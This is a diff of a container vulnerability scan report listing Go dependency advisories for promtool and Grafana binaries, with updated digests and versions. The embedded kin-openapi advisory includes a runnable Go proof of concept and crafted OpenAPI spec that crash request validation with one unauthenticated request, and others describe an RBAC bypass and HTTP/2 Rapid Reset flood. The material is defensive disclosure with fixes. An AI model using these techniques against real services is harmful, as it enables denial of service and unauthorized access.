-      * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits and active rate limiting on `RST_STREAM` frequency per connection.
-
-      ### Severity
-
-        | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score | Primary Impact |
-        | :--- | :--- | :--- | :--- |
-        | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access / Fail-Open |
-        | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption / Denial of Service |
-        | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash / Denial of Service |
-    Severity: HIGH
-    VendorSeverity:
-      ghsa: 3
-    CVSS:
-      ghsa:
-        V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N
-        V40Score: 8.8
-    References:
-    - https://github.com/grpc/grpc-go
-    - https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c19770b2935
-    - https://github.com/grpc/grpc-go/pull/9236
-    - https://github.com/grpc/grpc-go/releases/tag/v1.82.1
-    - https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf
-    PublishedDate: '2026-07-21T22:03:55Z'
-    LastModifiedDate: '2026-07-21T22:03:56Z'
 - Target: usr/bin/promtool
   Class: lang-pkgs
   Type: gobinary
   Packages: []
   Vulnerabilities:
   - VulnerabilityID: GO-2026-5932
-    PkgID: golang.org/x/crypto@v0.52.0
+    PkgID: golang.org/x/crypto@v0.53.0
     PkgName: golang.org/x/crypto
     PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/crypto@v0.52.0
-      UID: e59a4f7d0abf5558
-    InstalledVersion: v0.52.0
+      PURL: pkg:golang/golang.org/x/crypto@v0.53.0
+      UID: 855faedd270f0a78
+    InstalledVersion: v0.53.0
     Status: affected
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:9b3b14cdc6625bdc4ef862e518323583e18aa2c8d3d1b87de1494e88a5cbc58d
+    Fingerprint: sha256:07e5503a475fe8b993c3994201f5c6213fd42a48684f97be329cd8a9877a0258
     Title: The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and has known security issues
     Description: |-
       The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.
@@ -645,160 +73,6 @@
     References:
     - https://go.dev/issue/44226
     - https://pkg.go.dev/vuln/GO-2026-5932
-  - VulnerabilityID: CVE-2026-46600
-    VendorIDs:
-    - GO-2026-5942
-    PkgID: golang.org/x/net@v0.55.0
-    PkgName: golang.org/x/net
-    PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/net@v0.55.0
-      UID: f9566a120c579957
-    InstalledVersion: v0.55.0
-    FixedVersion: 0.56.0
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-46600
-    DataSource:
-      ID: govulndb
-      Name: The Go Vulnerability Database
-      URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:c6256e4459de2c5e49a0a31d632181dcfe4e5614717249370cd02bc134c324bd
-    Title: Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ...
-    Description: Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter value overflows the message buffer.
-    Severity: UNKNOWN
-    CweIDs:
-    - CWE-125
-    References:
-    - https://go.dev/cl/786345
-    - https://go.dev/issue/79795
-    - https://pkg.go.dev/vuln/GO-2026-5942
-    PublishedDate: '2026-07-21T20:17:01.213Z'
-    LastModifiedDate: '2026-07-23T18:27:48.877Z'
-  - VulnerabilityID: CVE-2026-56852
-    VendorIDs:
-    - GO-2026-5970
-    PkgID: golang.org/x/text@v0.38.0
-    PkgName: golang.org/x/text
-    PkgIdentifier:
-      PURL: pkg:golang/golang.org/x/text@v0.38.0
-      UID: 9948c7061f564f61
-    InstalledVersion: v0.38.0
-    FixedVersion: 0.39.0
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-56852
-    DataSource:
-      ID: govulndb
-      Name: The Go Vulnerability Database
-      URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:bc259fbb207d82143e3bb2dc8fdd60ea1f24aa0fd3a6ff755dae4e1498dbb849
-    Title: A norm.Iter can enter an infinite loop when handling input containing  ...
-    Description: A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.
-    Severity: HIGH
-    CweIDs:
-    - CWE-835
-    VendorSeverity:
-      azure: 3
-    References:
-    - https://go.dev/cl/794100
-    - https://go.dev/issue/80142
-    - https://nvd.nist.gov/vuln/detail/CVE-2026-56852
-    - https://pkg.go.dev/vuln/GO-2026-5970
-    PublishedDate: '2026-07-21T20:17:02.867Z'
-    LastModifiedDate: '2026-07-23T18:27:48.877Z'
-  - VulnerabilityID: GHSA-hrxh-6v49-42gf
-    PkgID: google.golang.org/grpc@v1.81.1
-    PkgName: google.golang.org/grpc
-    PkgIdentifier:
-      PURL: pkg:golang/google.golang.org/grpc@v1.81.1
-      UID: 73afc558a2cf1c6b
-    InstalledVersion: v1.81.1
-    FixedVersion: 1.82.1
-    Status: fixed
-    Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
-    SeveritySource: ghsa
-    PrimaryURL: https://github.com/advisories/GHSA-hrxh-6v49-42gf
-    DataSource:
-      ID: ghsa
-      Name: GitHub Security Advisory Go
-      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:b110f5c53b68084eba70b0f5c25d5703b022924be4f4213b4f735adb7e41bb6d
-    Title: 'gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities'
-    Description: |-
-      Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:
-
-      - Authorization Bypass (Fail-Open) when translating xDS RBAC policies containing `Metadata` or `RequestedServerName` fields.
-      - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset mitigation bypass during client-initiated stream resets.
-      - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies containing `NOT` rules around unsupported fields.
-
-
-      ### Impact
-      _What kind of vulnerability is it? Who is impacted?_
-
-      #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName` matchers
-
-      - Affected Component: xDS RBAC 
-      - Impact: When building policy matchers for gRPC RBAC from xDS configurations, unsupported `permission` and `principal` rules (specifically `Metadata` and `RequestedServerName`) were silently ignored and treated as no-ops.
-        - If an authorization policy relied purely on these matchers for access control, treating those rules as no-ops effectively removed the restrictions.
-      - If these unsupported rules were nested inside logical `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules, silently dropping them changed the boolean logic flow of the authorization engine.
-
-      As a result, policy evaluation decisions could fail open, allowing unauthorized clients to access protected gRPC services or resources.
-
-      #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream Aborts
-
-      - Affected Component: HTTP/2 transport
-      - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied threshold checks to items that directly resulted in control frames being written back to the wire, such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
-
-      When a client initiated a rapid flood of stream creation (`HEADERS`) immediately followed by stream termination `RST_STREAM`, items queued up in the control buffer without counting against the transport response frame threshold. An attacker can repeatedly trigger this flood sequence to bypass reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
-
-      #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside NOT Rules
-
-      - Affected Component: xDS RBAC 
-      - Impact: The xDS RBAC policy translators recursively generate matchers for nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such as `SourcedMetadata`), the recursive step returned an empty matcher. This could result in a runtime panic when the RBAC engine attempts to authorize an incoming request.
-
-      An attacker or misconfigured/malicious xDS management server delivering an LDS/RDS update containing a `NOT` rule around an unhandled field causes the gRPC server process to crash immediately (CWE-248 / Denial of Service).
-
-      ### Patches
-      _Has the problem been patched? What versions should users upgrade to?_
-
-      All three issues have been fixed in `master` and will be released in 1.82.1 shortly.
-
-      ### Workarounds
-      _Is there a way for users to fix or remediate the vulnerability without upgrading?_
-
-      If upgrading grpc-go immediately is not possible, apply the following workarounds based on your deployment architecture:
-
-      * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management servers do not push RBAC policies containing `Metadata`, `RequestedServerName`, or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to grpc-go servers.
-      * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits and active rate limiting on `RST_STREAM` frequency per connection.
-
-      ### Severity
-
-        | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score | Primary Impact |
-        | :--- | :--- | :--- | :--- |
-        | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access / Fail-Open |
-        | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption / Denial of Service |
-        | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash / Denial of Service |
-    Severity: HIGH
-    VendorSeverity:
-      ghsa: 3
-    CVSS:
-      ghsa:
-        V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N
-        V40Score: 8.8
-    References:
-    - https://github.com/grpc/grpc-go
-    - https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c19770b2935
-    - https://github.com/grpc/grpc-go/pull/9236
-    - https://github.com/grpc/grpc-go/releases/tag/v1.82.1
-    - https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf
-    PublishedDate: '2026-07-21T22:03:55Z'
-    LastModifiedDate: '2026-07-21T22:03:56Z'
 - Target: usr/share/grafana/bin/grafana
   Class: lang-pkgs
   Type: gobinary
@@ -814,15 +88,15 @@
     FixedVersion: 0.144.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-r277-6w6q-xmqw
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:9313f2ff362d213d5259a07daaac3c17bc64892aa8a0a0450d1c96dae769bcda
+    Fingerprint: sha256:89598647b9d8e0820f0a9d02c904c0cb0a0d4c92e560edb9ba74a68198a94cb4
     Title: 'kin-openapi: ValidationHandler.Load() Fail-Open Authentication Bypass via NoopAuthenticationFunc Default'
     Description: |-
       ### Summary
@@ -1210,15 +484,15 @@
     FixedVersion: 0.144.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-jpcw-4wr7-c3vq
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:6af60a88ad5ae5c062fee0031c0444c066d38b8f272509106d4ab27513c7966a
+    Fingerprint: sha256:55ffbe87f915340846b31da03f5aad03851337f4d02fde816449425fc57d96c9
     Title: 'kin-openapi openapi3filter: unauthenticated nil-pointer panic when validating a request against a `content` parameter whose media type has no schema'
     Description: "| Field | Value |\n|---|---|\n| Ecosystem | Go |\n| Package | `github.com/getkin/kin-openapi` |\n| Affected versions | `<= 0.143.0` (introduced in `v0.2.0`, PR #90, 2019-05-07; reproduced on `HEAD` `30e2923`) |\n| Patched versions | 0.144.0 |\n---\n\n### Summary\n\n`openapi3filter.ValidateRequest` contains a NULL-pointer-dereference denial of service: any **unauthenticated** client can crash the request-validation path with a **single** HTTP request. When an operation declares a `content` parameter (as opposed to a `schema` parameter) whose media type object has **no `schema`**, request validation dereferences that missing schema and panics. The document is legal under the OpenAPI Specification — kin-openapi's own `doc.Validate()` accepts it — and the defect affects **both OpenAPI 3.0.x and 3.1.x**. Depending on how the library is wired into the server (see Impact), this ranges from a per-request abort with unbounded panic-log growth to a full remote process crash.\n\n### Details\n\nThe decoder used for `content` parameters when no custom `ParamDecoder` is configured (the library default), `defaultContentParameterDecoder`, dereferences the media-type schema without a nil check.\n\n`openapi3filter/req_resp_decoder.go`, around line 197:\n\n```go\nmt := content.Get(\"application/json\")\nif mt == nil {                       // media-type OBJECT is guarded ...\n    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)\n    return\n}\noutSchema = mt.Schema.Value          // ... but mt.Schema is NOT — panics when nil\n```\n\nThe function guards `param.Content == nil`, `len(content) != 1`, and `mt == nil`, but never `mt.Schema == nil`.\n\n**Why a schema-less content parameter is legal** (so the sink is reachable — `doc.Validate()` returns no error), in both 3.0.x and 3.1.x:\n\n- `openapi3/parameter.go` — `Parameter.Validate` only enforces *exactly one of `schema` XOR `content`*; a parameter with `content` (and no `schema`) satisfies it.\n- `openapi3/media_type.go` — `MediaType.Validate` validates the schema **only when it is non-nil**, so an absent schema is not a validation error.\n\n**Call path to the panic:**\n\n```\nValidateRequest                          openapi3filter/validate_request.go:83\n  └─ ValidateParameter                   openapi3filter/validate_request.go:177   (parameter.Content != nil)\n       └─ decodeContentParameter         openapi3filter/req_resp_decoder.go:166   (attacker supplies value ⇒ found)\n            └─ defaultContentParameterDecoder   openapi3filter/req_resp_decoder.go:197   ← nil deref / panic\n```\n\n**Authentication note:** `ValidateRequest` validates security *before* parameters, but the panic is reachable **without credentials** whenever the target operation declares no security requirement, or when no `AuthenticationFunc` is configured (it is opt-in). A single unauthenticated operation anywhere in the served spec is sufficient. If an operation *does* declare security and a rejecting `AuthenticationFunc` is wired, that request is rejected before decoding.\n\n### PoC\n\nReproduced end-to-end against `HEAD` (`30e2923`) with a real `net/http` server and a stock `http.Client`.\n\n**1. Minimal OpenAPI 3.0.3 document** (legal — `doc.Validate()` passes). The `cfg` query parameter uses `content` with an `application/json` media type that has **no `schema`**:\n\n```yaml\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /c:\n    get:\n      parameters:\n        - name: cfg\n          in: query\n          content:\n            application/json: {}      # media type object with NO schema\n      responses:\n        \"200\": {description: ok}\n```\n\n**2. A complete, self-contained program.** Drop this into a directory inside a checkout of `github.com/getkin/kin-openapi` and run it with `go run .`. It loads the document above, asserts `doc.Validate()` accepts it (proving reachability), serves it behind request validation exactly as the recommended middleware does, and sends one unauthenticated `GET /c?cfg=1`:\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\n\t\"github.com/getkin/kin-openapi/openapi3\"\n\t\"github.com/getkin/kin-openapi/openapi3filter\"\n\t\"github.com/getkin/kin-openapi/routers/gorillamux\"\n)\n\nconst spec = `\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /c:\n    get:\n      parameters:\n        - name: cfg\n          in: query\n          content:\n            application/json: {}      # media type object with NO schema\n      responses:\n        \"200\": {description: ok}\n`\n\nfunc main() {\n\tloader := openapi3.NewLoader()\n\tdoc, err := loader.LoadFromData([]byte(spec))\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t// Reachability: the malformed-but-legal document must validate.\n\tif err := doc.Validate(context.Background()); err != nil {\n\t\tpanic(\"doc.Validate rejected the spec, not reachable: \" + err.Error())\n\t}\n\trouter, err := gorillamux.NewRouter(doc)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Handler mirrors openapi3filter.ValidationHandler: find route, validate.\n\th := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\troute, pathParams, err := router.FindRoute(r)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusNotFound)\n\t\t\treturn\n\t\t}\n\t\t// Panics here on the crafted request (req_resp_decoder.go:197).\n\t\tif err := openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{\n\t\t\tRequest:    r,\n\t\t\tPathParams: pathParams,\n\t\t\tRoute:      route,\n\t\t\tOptions:    &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},\n\t\t}); err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\t\tw.WriteHeader(http.StatusOK)\n\t})\n\n\tsrv := httptest.NewServer(h)\n\tdefer srv.Close()\n\n\t// The single, unauthenticated attack request.\n\tresp, err := http.Get(srv.URL + \"/c?cfg=1\")\n\tif err != nil {\n\t\t// Expected: the server goroutine panicked, so the client sees EOF.\n\t\tfmt.Printf(\"client received an aborted response (expected): %v\\n\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tfmt.Printf(\"UNEXPECTED: got HTTP %d without a panic\\n\", resp.StatusCode)\n}\n```\n\n**3. Observed result** — the request goroutine panics inside validation, and the client's `http.Get` returns an EOF:\n\n```\nhttp: panic serving 127.0.0.1:xxxxx: runtime error: invalid memory address or nil pointer dereference\ngithub.com/getkin/kin-openapi/openapi3filter.defaultContentParameterDecoder(...)\n\topenapi3filter/req_resp_decoder.go:197\ngithub.com/getkin/kin-openapi/openapi3filter.decodeContentParameter(...)\n\topenapi3filter/req_resp_decoder.go:166\ngithub.com/getkin/kin-openapi/openapi3filter.ValidateParameter(...)\n\topenapi3filter/validate_request.go:177\ngithub.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)\n\topenapi3filter/validate_request.go:83\n```\n\nSwapping the media type for one that carries a schema (`application/json: {schema: {type: object}}`) makes the same request return a clean `400` instead of panicking, confirming the missing schema is the cause.\n\n### Impact\n\nThis is an **unauthenticated remote denial of service** (CWE-476) against any service that validates incoming requests with `openapi3filter` and serves a spec containing at least one `content` parameter whose media type lacks a `schema`.\n\nThe precise consequence depends on which goroutine runs the panic and whether a `recover()` covers it:\n\n| Wiring | Recovered by `net/http`? | Result |\n|---|---|---|\n| Synchronous middleware / handler on `net/http` (incl. `openapi3filter.ValidationHandler`) | Yes | Process survives; the one request is aborted. A remote unauthenticated party can still drive connection churn + unbounded `http: panic serving` log growth. |\n| `ValidateRequest` on an app-spawned goroutine (fan-out, `errgroup`, async pre-check) | No | **Whole process crashes** on a single unauthenticated request unless the app added its own `recover()`. |\n| Non-`net/http` host (fasthttp adaptor, gRPC-gateway shim, CLI, offline/batch spec validator) | No | **Whole process crashes.** |\n\nThis is why the suggested CVSS uses `A:L` (Base 5.3): under the recommended synchronous `net/http` wiring the panic is recovered per-connection. Reviewers may reasonably raise it to `A:H` (Base 7.5) for the spawned-goroutine and non-`net/http` integrations, where a single request kills the process.\n\n---\n\n## Remediation (suggested)\n\nAdd a `mt.Schema == nil` guard mirroring the existing `mt == nil` guard, so a schema-less content parameter yields a clean validation error instead of a panic:\n\n```go\nmt := content.Get(\"application/json\")\nif mt == nil {\n    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)\n    return\n}\nif mt.Schema == nil {\n    err = fmt.Errorf(\"parameter %q content media type has no schema\", param.Name)\n    return\n}\noutSchema = mt.Schema.Value\n```\n\nThe `unmarshal` closure immediately below already tolerates a nil schema (it checks `paramSchema != nil`), so returning early on nil `mt.Schema` is consistent with surrounding intent.\n\n**Workarounds for consumers, pending a patch:**\n\n- Ensure every `content` parameter in served specs declares a `schema`, or reject such specs at load time.\n- Supply a custom `ParamDecoder` that guards `mt.Schema == nil`.\n- Run request validation inside a handler with an explicit `recover()` — especially if validation runs off the request goroutine or on a non-`net/http` host.\n\n## Notes for the maintainer\n\nThis root cause (`mt.Schema == nil`) is independent of the `Items == nil` panics addressed in `30e2923` and of `GHSA-mmfr-pmjx-hw9w`; no prior fix touched this code path. It affects OpenAPI 3.0.x as well as 3.1.x."
     Severity: MEDIUM
@@ -1245,15 +519,15 @@
     FixedVersion: 0.29.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-gcjh-h69q-9w9g
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:28eb1705cfa51484312ea76bfe659a6ed156e3e97a541a7a446afd9ab6760998
+    Fingerprint: sha256:a82cb7a3a8cbfaa1039507946b2825e445ef4be31de87c43b904305786acfa4d
     Title: 'cel-go: JSON Private Fields Exposed via NativeTypes and ParseStructTag'
     Description: |-
       The function `ext.NativeTypes(ParseStructTag("json"))` does not honour the `encoding/json` skip directive `json:"-"`. Fields tagged `json:"-"` are registered in the CEL type system under the literal name `"-"` and are readable from any user-submitted CEL expression via `dyn(obj)["-"]`. 
@@ -1645,15 +919,15 @@
     FixedVersion: 2.8.4, 2.9.2, 2.10.2
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-21728
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:1b4ee481166e2574723ea1a5abd4bb9e34001c2f1eb12e51fdd8223f0acee10a
+    Fingerprint: sha256:db88dbeed4a8f4f8f9fc77f71ef4814124f20a4dcb2abe84cf83364ffed2c76f
     Title: 'grafana/tempo: Tempo: Denial of Service via large queries'
     Description: |-
       Tempo queries with large limits can cause large memory allocations which can impact the availability of the service, depending on its deployment strategy.
@@ -1705,15 +979,15 @@
     FixedVersion: 2.10.3
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-28377
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:d3045f258b228bc260aeae30f8f77f38b6c625cfd351a164153c2175e9b5f2b8
+    Fingerprint: sha256:a359dd6bb9ce5ee3d634418c80d79c58080612266da5c42fe18c53d78b02a7da
     Title: 'Grafana Tempo: Grafana Tempo: Information disclosure of S3 encryption key via status config endpoint'
     Description: |-
       A vulnerability in Grafana Tempo exposes the S3 SSE-C encryption key in plaintext through the /status/config endpoint, potentially allowing unauthorized users to obtain the key used to encrypt trace data stored in S3.
@@ -1752,13 +1026,13 @@
     InstalledVersion: v0.52.0
     Status: affected
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:1fffec94967fc2316488f2ed6f1c898c414ccd3ecfd4059c47c9eb567947b9e8
+    Fingerprint: sha256:50510eb990d6ffd0c6b183c305059390dc028c5459ea839386424fac68783adb
     Title: The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and has known security issues
     Description: |-
       The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.
@@ -1780,14 +1054,14 @@
     FixedVersion: 0.56.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-46600
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:6c49c04fc92b93c610bfa0e43c7124d040562abc37296e56cb57624bfd1bd3db
+    Fingerprint: sha256:6cb5e662d75f748542b2285fbb05fa31ab42496bb8419d878fee3b8c8e51ac31
     Title: Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ...
     Description: Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter value overflows the message buffer.
     Severity: UNKNOWN
@@ -1811,14 +1085,14 @@
     FixedVersion: 0.39.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-56852
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:8679aff140f797ea84b3e23c589f70d301eb59709ea35bd69b7ad09a37acde61
+    Fingerprint: sha256:f02b57220c81780dfa7d4b0d2776a2a94de411baaccc5d4655f46c134c6d28c7
     Title: A norm.Iter can enter an infinite loop when handling input containing  ...
     Description: A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.
     Severity: HIGH
@@ -1843,15 +1117,15 @@
     FixedVersion: 1.82.1
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-hrxh-6v49-42gf
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:4bdd6808a0ff3132a719cb4a43c36a94113b82e1d8d6c40a624418082cecffbf
+    Fingerprint: sha256:d2ee31c30167fd89cfe232e38bde172a38b655dd8465a01dc9ffc04987101a0b
     Title: 'gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities'
     Description: |-
